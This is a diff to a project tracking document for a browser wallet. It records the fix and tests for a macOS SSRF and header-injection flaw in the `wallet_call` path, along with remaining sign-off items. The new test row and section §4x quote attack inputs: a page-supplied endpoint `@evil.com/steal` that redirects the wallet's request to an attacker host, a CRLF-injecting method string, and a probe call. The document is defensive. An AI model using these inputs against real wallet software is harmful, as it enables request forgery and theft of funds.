@@ -1,7 +1,7 @@
 # Phase 0.5 — money path & trust boundary · PHASE CONTRACT
 
 **Workstream:** WS5(a) · **Ticket:** `../TICKET_loopback_host_form_wallet_routing.md` §6.2, §7.1, §7.3
-**Status:** 🔴 NOT SIGNED OFF — **REPAIR COMPLETE, BLOCKED ON A NEW CRITICAL.** Findings 4, 5 and 6 are fixed and GREEN with REDs run in-session (§4j); the first panel's 3 criticals remain MEASURED and closed. ✅ **§4k — the new critical found 2026-08-19 — is FIXED and GREEN with RED (`81c054c`)**, including an owner-clicked control proving the connect-approval path still writes. Still owed: `G1` on a release-shaped build and the post-repair panel. Repair prompt: `../SESSION_PROMPT_beta3_p05_repair.md` · **Opened:** 2026-08-18 · **Amended:** 2026-08-19 (§4a–§4c, §5a), 2026-08-19 **repair scope** (§2, §4 split into 0.5a/0.5b, §4e–§4g, §5b, §6) · **Platforms:** both (Rust = one binary; the C++ gates are cross-platform)
+**Status:** 🟠 NOT SIGNED OFF — **all known blockers closed; awaiting owner sign-off.** Findings 4, 5 and 6 are fixed and GREEN with REDs run in-session (§4j); the first panel's 3 criticals remain MEASURED and closed. ✅ **§4k — the new critical found 2026-08-19 — is FIXED and GREEN with RED (`81c054c`)**. ✅ **Windows side DONE** (all 4 panel-#3 blockers + pay402, panel re-run complete — relay round 2026-08-21c). ✅ **macOS `wallet_call` SSRF (`P0.5-S1` / the relay's E1, the last macOS-only blocker) FIXED cross-platform, GREEN+RED — §4x** (`d462083`, Mac round 2026-08-21d); the C++ suite now builds+runs on macOS (206/205-pass/1-skip); all 3 macOS parity checks PASS; M1 self-nav code-closed. **Still owed for full sign-off (owner-gated):** the live-browser S1 probe (isolation-blocked here), two open macOS correctness bugs (brc100_auth role string; `wallet_delete_cancel` `__APPLE__` arm), and the E3 scoped macOS-overlay adversarial pass (recommended). Repair prompt: `../SESSION_PROMPT_beta3_p05_repair.md` · **Opened:** 2026-08-18 · **Amended:** 2026-08-19 (§4a–§4c, §5a), 2026-08-19 **repair scope** (§2, §4 split into 0.5a/0.5b, §4e–§4g, §5b, §6) · **Platforms:** both (Rust = one binary; the C++ gates are cross-platform)
 **Standard:** `../HARNESS.md`.
 
 > ⭐ **Scope change, owner-approved 2026-08-19: C1, C2 and C3 are folded into this phase.**
@@ -90,6 +90,7 @@ is rewritten to match.
 | `P0.5-G2` | The same page gets **no** `window.hodosBrowser.identity` | Pre-fix it must be **defined**. Control: the same page *without* the substring must get neither | Renderer for **that page's** frame — not an overlay. `type:"page"` over CDP is not proof of which browser | T2 | ✅ **GREEN, RED observed** — §4b |
 | `P0.5-G3` |  `preflight.ps1` gate `G2` passes at baseline **2** (from 5) | Add one new `find("127.0.0.1:5137")` → gate **exits non-zero** even at a non-zero baseline | `preflight.ps1 -NegativeControl` | T0 | ✅ **GREEN** `2 violations, at baseline`; 🔴 observed `3 > 2` |
 | `P0.5-E1` | An origin-less **or origin-forged** frame is gated | Feed both an `about:blank` child **and** the crafted `data:` URL → each must be seen ungated pre-fix | The Rust-side gate outcome | T1 | ✅ **GREEN, RED observed — §4i.** `about:blank` child now inherits `example.com` and is denied; pre-fix empty origin ⇒ `IsInternalOrigin("")==true` ⇒ dispatched. Superseded by `X1` |
+| `P0.5-S1` 🚨**NEW (Mac 2026-08-21d)** — the relay's "E1" `wallet_call` SSRF, distinct from `P0.5-E1` above | `dispatchWalletHttpByMethod` refuses a page-controlled `endpoint`/`method` that would escape the wallet authority or inject CRLF. macOS-only-**exploitable** (libcurl arm had no validation; Windows fails closed only by `ParseUrl`'s accidental digits-only port check), fixed **cross-platform** at the one shared choke — `IsWalletDispatchUrlSafe` anchors url to `WalletBaseUrl()+"/"` + no ctrl chars; `IsValidWalletMethod` = `^[A-Z]{1,8}$`. ⛔ NOT by porting `ParseUrl` | ⛔ Pre-fix: **no validation** — `endpoint="@evil.com/steal"` ⇒ curl fetches `evil.com` from the wallet process; `method="GET\r\nHost: evil"` injects. RED **observed** by weakening both predicates to `return true`: the 5 `Rejects*` unit cases fail, the 2 `Accepts*` hold | The two `PortConfig.h` predicates, unit-testable without CEF/curl (same class as `X4`); production compile confirmed by a clean macOS `HodosBrowserShell` bundle build | T0/T1 | ✅ **GREEN, RED observed — §4x.** `tests/wallet_ssrf_guard_test.cpp` (7 cases) in `hodos_tests`; suite 206/205-pass/1-skip on macOS. ⚠️ Live-browser dynamic probe deferred (needs a signed browser; prod-mode bundle ⛔ opens the real profile) — money-safe dev recipe in relay round 2026-08-21d |
 
 ### Half 0.5b — Rust money path
 
@@ -1684,3 +1685,55 @@ NOT fired pre-fix; their RED is the same `is_permission_surface` mechanism alrea
 ⚠️ **The systematic `is_permission_surface`-as-subtree audit is STILL a Phase 5 item** — this closed the
 concrete dApp-reachable fund-mover class the panel named, but the owner-deferred structural move (a
 default-deny subtree in `domain_trust_mw` rather than an ever-growing arm list) remains owed.
+
+### 4x. `P0.5-S1` — `wallet_call` SSRF closed cross-platform (Mac 2026-08-21d, commit `d462083`)
+
+The relay's standing **E1** (distinct from `P0.5-E1`, the origin-forged-frame row). Reproduced first,
+structurally, against the current tree: `SyncHttpClient.cpp` — `ParseUrl` is defined at `:21` **inside
+`#ifdef _WIN32` (opened `:13`)**; the macOS arm opens at `#elif defined(__APPLE__)` `:355` and passes
+the page-controlled `url` to `CURLOPT_URL` (`:378`, `:532`) and the page-controlled method to
+`CURLOPT_CUSTOMREQUEST` (`:537`) with **zero validation**. The shared `dispatchWalletHttpByMethod`
+(`HttpRequestInterceptor.cpp`) had no guard either. So on macOS a page-supplied `endpoint`
+(`HandleIpcWalletCall` builds `WalletBaseUrl() + endpoint`, no trailing slash on the base) +
+page-supplied `method` was an **arbitrary-method / arbitrary-body loopback request primitive**
+(`endpoint="@evil.com/x"` ⇒ `http://127.0.0.1:31301@evil.com/x`, curl keys on the last `@`).
+
+**Fix — one predicate pair, both platforms, applied ONCE** at the single shared dispatch choke
+(`dispatchWalletHttpByMethod`, which every IPC path — `runIpcCallDirect` and the engine cascade —
+funnels through, and which is wallet-only so the appcast/download `SyncHttpClient` callers are
+untouched). ⛔ **Not** by porting `ParseUrl`: replicating Windows' accidental digits-only safety would
+be a second derivation of one value on two platforms (the `RegistrableDomainFromUrl` failure mode).
+`PortConfig.h` now carries `IsWalletDispatchUrlSafe` (anchor to `WalletBaseUrl()+"/"`, no C0/DEL) and
+`IsValidWalletMethod` (`^[A-Z]{1,8}$`). On failure the guard returns `{success:false, statusCode:0}` —
+the outcome every caller already handles — so **Windows now fails closed by design too**, before
+`ParseUrl`, which is strictly stronger than the prior accident and satisfies the cross-platform
+negative control (the same predicate rejects the same input on both platforms).
+
+**GREEN + RED.** `tests/wallet_ssrf_guard_test.cpp` (7 cases) in `hodos_tests`. RED observed by
+weakening **both** predicates to `return true` (the pre-fix "no validation" state), rebuilding, running:
+the 5 `Rejects*` cases fail (userinfo escape, foreign scheme/host, missing leading slash, control chars,
+method injection) while the 2 `Accepts*` hold; restored → green. Same evidence class as `P0.5-X4`
+(pure PortConfig predicate, unit-falsifiable, no live browser). Production compile confirmed: the full
+`HodosBrowserShell` app bundle **built + linked clean on macOS** with the guard in place.
+
+⚠️ **Not done — the live-browser dynamic probe.** `cefMessage.send('wallet_call', ['probe1','x',
+'@example.com/','{}','GET'])` needs a running signed browser + a loaded page + the wallet; on this box
+that is a prod-mode bundle (⛔ opens the real profile — the standing isolation rule) or a full dev-stack
+stand-up. Deferred as the X4-class unit evidence + shared-path fix cover the falsifiability. Money-safe
+recipe for whoever runs it: dev build (`HODOS_DEV=1`, wallet 31401), probe a **local** listener via
+`@127.0.0.1:<myport>/` — vulnerable ⇒ listener receives the connection; fixed ⇒ guard rejects, nothing
+dials out.
+
+**Also this round (test-infra, HARNESS §6 test-only):** the C++ suite had **never built on macOS**.
+Three fixes stood it up — `update_fs_test.cpp` scoped to `_WIN32` (the code it tests is `_WIN32`-only);
+`Security.framework` linked for `FarblingPolicy`'s `SecRandomCopyBytes`; and the test binary ad-hoc
+`codesign`ed in `POST_BUILD` (the global `-Wl,-no_adhoc_codesign` left it unsigned and arm64 SIGKILLs
+it — exit 137, which also made `gtest_discover_tests` report "Subprocess killed"). Result **206 tests,
+205 passed, 1 skipped** (`UpdateStagerRig.StagesFromLocalFeed`), ctest 100%. 206 < Windows 223 because
+`update_fs`'s 33 + some stager/farbling cases are `_WIN32`-only (no macOS behaviour to test); +7 new S1.
+
+**Still owner-gated for full sign-off**, unchanged by this round: the live-browser S1 leg above, and the
+two open macOS correctness bugs the parity pass surfaced — the BRC-100 overlay role string
+(`"brc100_auth"` vs `"brc100auth"`, `cef_browser_shell_mac.mm:3502`) and `wallet_delete_cancel`'s
+missing `__APPLE__` arm (`simple_handler.cpp:4285`). Neither is a security regression; both are reported
+in relay round 2026-08-21d.
